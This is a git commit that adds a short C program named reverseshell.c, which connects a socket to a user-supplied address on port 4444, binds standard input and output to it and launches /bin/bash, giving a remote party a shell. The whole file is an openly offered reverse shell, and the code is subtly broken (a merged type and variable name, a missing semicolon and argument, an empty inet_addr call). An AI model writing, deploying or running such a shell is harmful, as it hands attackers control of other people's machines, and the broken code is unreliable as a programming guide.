d9d727cf4e9addc103cdab96dfb0ae46b0772e9a
krishpranav <krishna.pranav@gmail.com>
2020-07-28 23:14:49 -0400

    first commit

---
+++ reverseshell.c
@@ -0,0 +1,30 @@
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+int main(void) {
+
+    int sockt;
+    int port = 4444;
+    struct sockaddr_in_revsockaddr;
+
+    sockt = socket(AF_INET, SOCK_STREAM)
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr(); //enter your target ip address
+
+    connect(sockt, (struct sockaddr *) &revsockaddr,
+    sizeof(revsockaddr));
+
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/bash", NULL};
+    execve("/bin/bash", argv, NULL);
+
+    return 0;
+}
